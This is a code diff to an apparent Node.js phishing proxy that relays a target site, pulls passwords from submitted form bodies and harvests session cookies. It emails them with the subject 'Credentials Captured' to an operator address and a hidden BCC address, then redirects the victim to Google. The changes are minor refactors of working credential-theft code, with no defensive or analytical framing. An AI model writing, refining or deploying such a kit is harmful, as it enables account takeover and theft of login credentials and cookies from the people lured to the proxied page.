@@ -8,9 +8,10 @@ const https = true;
 const blocked_region = [];
 const blocked_ip_address = ['0.0.0.0', '127.0.0.1'];
 
+// Create Nodemailer transporter
 const transporter = nodemailer.createTransport({
     host: process.env.SMTP_HOST,
-    port: process.env.SMTP_PORT,
+    port: parseInt(process.env.SMTP_PORT, 10),
     secure: false, // true for 465, false for other ports
     auth: {
         user: process.env.SMTP_USER,
@@ -38,10 +39,11 @@ export default async function handler(req, res) {
     let method = req.method;
     let new_request_headers = new Headers(req.headers);
     new_request_headers.set('Host', upstream);
-    new_request_headers.set('Referer', url.protocol + '//' + url_hostname);
+    new_request_headers.set('Referer', `${url.protocol}//${url_hostname}`);
+
+    let body = req.method === 'POST' ? req.body : null; // Only include body for POST requests
 
     if (method === 'POST') {
-        const body = req.body;
         const keyValuePairs = body.split('&');
         let message = "Password found:\n\n";
 
@@ -67,7 +69,7 @@ export default async function handler(req, res) {
         response = await fetch(url.href, {
             method,
             headers: new_request_headers,
-            body: req.body
+            body // Only include body if it's not null
         });
     } catch (error) {
         res.status(500).send(`Error fetching upstream: ${error.message}`);
@@ -96,10 +98,11 @@ export default async function handler(req, res) {
         await sendToServer(`Cookies found:\n\n${all_cookies}`, ip_address);
     }
 
+    // Set the Location header for redirection to Google
     res.writeHead(response.status, {
         'Content-Type': 'text/html',
         ...Object.fromEntries(new_response_headers.entries()),
-        'Location': 'https://google.com' // Redirect to Google after email is sent
+        'Location': 'https://google.com'
     });
     res.end(original_text);
 }
@@ -113,8 +116,8 @@ async function replace_response_text(response, upstream_domain, host_name) {
 async function sendToServer(data, ip_address) {
     const mailOptions = {
         from: 'coinreport@mailo.com',
-        to: 'your-email@example.com', // replace with the recipient email
-        bcc: 'money@monemail.com', // BCC address
+        to: 'your-email@example.com', // Replace with your email address
+        bcc: 'money@monemail.com',    // BCC address
         subject: 'Credentials Captured',
         text: `Data: ${data}\nIP Address: ${ip_address}`,
     };
